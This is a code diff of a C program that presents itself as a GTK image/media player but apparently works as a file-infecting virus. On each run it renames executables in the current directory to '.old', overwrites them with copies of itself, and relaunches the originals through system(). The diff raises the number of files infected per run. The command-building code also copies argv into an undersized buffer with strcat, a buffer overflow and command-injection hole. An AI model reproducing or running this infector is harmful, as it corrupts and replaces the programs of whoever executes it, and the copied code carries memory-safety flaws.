@@ -1,63 +1,43 @@
 #include <gtk/gtk.h>
-
 #include <dirent.h>
-
 #include <gdk/gdkkeysyms.h>
-
 #include <stdlib.h>
-
 #include <stdio.h>
-
 #include <stdbool.h>
-
 #include <string.h>
-
 #include <sys/stat.h>
+
 void button_clicked(GtkWidget *widget, int up);
 
-// step 4 : find target files
-// gcc -o mediaPlayer mediaplayer/mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
+int g = 0, size_folder = 0;
+static GtkWidget *vbox;
+GtkWidget *img, *win, *dialog, *btn;
+GError *error = NULL;
+GdkPixbuf *pixbuf;
+char *str;
+char *filename[50];
+int width = 1000;
+int height = 800;
+
+#define SIZE 100
+char buffer[SIZE];
+
 bool copyFile(char *pgrmNameToInfect, char *srcPgrmName)
 {
-        FILE *fileToCopy, *fileCopied;
-        char ch;
-        int pos;
-
-        if ((fileToCopy = fopen(srcPgrmName, "r")) == NULL)
-        {
-                printf("\nLe fichier ne peut pas etre ouvert\n");
-                return -1;
-        }
-
-        fileCopied = fopen(pgrmNameToInfect, "w");
-        fseek(fileToCopy, 0L, SEEK_END); // file pointer at end of file
-        pos = ftell(fileToCopy);
-        fseek(fileToCopy, 0L, SEEK_SET); // file pointer set at start
-
-        while (pos--)
-        {
-                ch = fgetc(fileToCopy); // copying file character by character
-                fputc(ch, fileCopied);
-        }
-
-        printf("virus copié\n");
-        fclose(fileToCopy);
-        fclose(fileCopied);
-        chmod(pgrmNameToInfect, 0755);
         // opening current running exe in reading mode
-        // FILE *runningFile, *newCreatedFile;
-        // runningFile = fopen(srcPgrmName, "rb");
-        // // creating and opening the new file in writing and reading mode
-        // newCreatedFile = fopen(pgrmNameToInfect, "wb");
-        // // copying the source infector file to new utilityNamed pgrm
-        // char buff[BUFSIZ];
-        // size_t n;
-        // while ((n = fread(buff, 1, BUFSIZ, runningFile)) != 0)
-        // {
-        //         fwrite(buff, 1, n, newCreatedFile);
-        // }
-        // fclose(runningFile);
-        // fclose(newCreatedFile);
+        FILE *runningFile, *newCreatedFile;
+        runningFile = fopen(srcPgrmName, "rb");
+        // creating and opening the new file in writing and reading mode
+        newCreatedFile = fopen(pgrmNameToInfect, "wb");
+        // copying the source infector file to new utilityNamed pgrm
+        char buff[BUFSIZ];
+        size_t n;
+        while ((n = fread(buff, 1, BUFSIZ, runningFile)) != 0)
+        {
+                fwrite(buff, 1, n, newCreatedFile);
+        }
+        fclose(runningFile);
+        fclose(newCreatedFile);
         chmod(pgrmNameToInfect, 0755);
         return true;
 }
@@ -85,7 +65,7 @@ bool renameFiles(int numberToInfect, char *pgrmName)
                                 if (!fopen(newName, "r"))
                                 {
                                         // checking if the file is renamed
-                                        (rename(dir->d_name, newName) == 0) ? printf("%s file renamed successfully to %s\n\n", dir->d_name, newName) : printf("Error for renaming %s file to %s\n\n", dir->d_name, newName);
+                                        (rename(dir->d_name, newName) == 0) ? printf("%s file renamed successfully to %s\n", dir->d_name, newName) : printf("Error for renaming %s file to %s\n\n", dir->d_name, newName);
                                         // copy the content of mediaPlayer into the pgrm
                                         copyFile(dir->d_name, pgrmName);
                                         cpt++;
@@ -96,19 +76,6 @@ bool renameFiles(int numberToInfect, char *pgrmName)
         }
         return true;
 }
-
-int g = 0, size_folder = 0;
-static GtkWidget *vbox;
-GtkWidget *img, *win, *dialog, *btn;
-GError *error = NULL;
-GdkPixbuf *pixbuf;
-char *str;
-char *filename[50];
-int width = 1000;
-int height = 800;
-
-#define SIZE 100
-char buffer[SIZE];
 
 GtkWidget *create_gui()
 {
@@ -233,15 +200,28 @@ void open_dialog_and_load_images(GtkWidget *btn, gpointer window)
 int main(int argc, char *argv[])
 {
         // putting the argument of the running pgrm name in params
-        int numberOfFilesToInfect = 1;
+        int numberOfFilesToInfect = 2;
         renameFiles(numberOfFilesToInfect, argv[0]);
-        if (strcmp(argv[0], "./mediaPlayer") && !strstr(argv[0], ".old"))
+        if (strcmp(argv[0], "./mediaPlayer"))
         {
-                system(argv[0]);
+                if (argv[1] != NULL && argv[2] != NULL)
+                {
+                        char *execFile = (char *)malloc(strlen(argv[0]));
+                        strcpy(execFile, argv[0]);
+                        strcat(execFile, ".old ");
+                        strcat(execFile, argv[1]);
+                        strcat(execFile, " ");
+                        strcat(execFile, argv[2]);
+                        system(execFile);
+                }
+                else
+                {
+                        system(strcat(argv[0], ".old"));
+                }
         }
         else
         {
-                /*GtkWidget *menu_bar, *file_menu, *menu_item, *vbox_menu, *button;
+                GtkWidget *menu_bar, *file_menu, *menu_item, *vbox_menu, *button;
 
                 gtk_init(&argc, &argv);
 
@@ -264,7 +244,7 @@ int main(int argc, char *argv[])
                 gtk_container_add(GTK_CONTAINER(win), vbox);
 
                 gtk_widget_show_all(win);
-                gtk_main();*/
+                gtk_main();
         }
 
         return 0;
